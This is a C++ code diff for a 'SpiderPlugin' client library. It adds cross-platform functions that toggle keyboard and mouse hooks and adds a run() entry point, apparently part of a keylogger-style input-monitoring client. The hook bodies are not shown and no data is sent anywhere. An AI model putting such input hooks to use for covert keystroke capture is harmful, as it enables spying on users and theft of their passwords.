@@ -14,7 +14,12 @@ namespace client
 {
 namespace library
 {
-SpiderPlugin::SpiderPlugin()
+SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(false)
+#if defined _WIN32
+                               ,
+                               m_keyboardHookWin(nullptr),
+                               m_mouseHookWin(nullptr)
+#endif
 {
 }
 
@@ -48,14 +53,71 @@ bool SpiderPlugin::deinit()
     return ret;
 }
 
-SystemInfos SpiderPlugin::getInfos() const
+SystemInfos const &SpiderPlugin::getInfos() const
+{
+    return m_infos;
+}
+
+bool SpiderPlugin::getKeyboard()
+{
+    if (!m_keyboardHook)
+    {
+// Hook keyboard
+#if defined _WIN32
+        m_keyboardHook = hookKeyboardWindows();
+#elif defined __APPLE__
+        m_keyboardHook = hookKeyboardOSX();
+#elif defined __linux__
+        m_keyboardHook = hookKeyboardLinux();
+#endif
+    }
+    else
+    {
+// Un-hook keyboard
+#if defined _WIN32
+        m_keyboardHook = unHookKeyboardWindows();
+#elif defined __APPLE__
+        m_keyboardHook = unHookKeyboardOSX();
+#elif defined __linux__
+        m_keyboardHook = unHookKeyboardLinux();
+#endif
+    }
+    return m_keyboardHook;
+}
+
+bool SpiderPlugin::getMouse()
+{
+    if (!m_mouseHook)
+    {
+// Hook mouse
+#if defined _WIN32
+        m_mouseHook = hookMouseWindows();
+#elif defined __APPLE__
+        m_mouseHook = hookMouseOSX();
+#elif defined __linux__
+        m_mouseHook = hookMouseLinux();
+#endif
+    }
+    else
+    {
+// Un-hook mouse
+#if defined _WIN32
+        m_mouseHook = unHookMouseWindows();
+#elif defined __APPLE__
+        m_mouseHook = unHookMouseOSX();
+#elif defined __linux__
+        m_mouseHook = unHookMouseLinux();
+#endif
+    }
+    return m_mouseHook;
+}
+
+void SpiderPlugin::run()
 {
 #if defined _WIN32
-    return getInfosWindows();
+    runWindows();
 #elif defined __APPLE__
-    return getInfosOSX();
 #elif defined __linux__
-    return getInfosLinux();
 #endif
 }
 
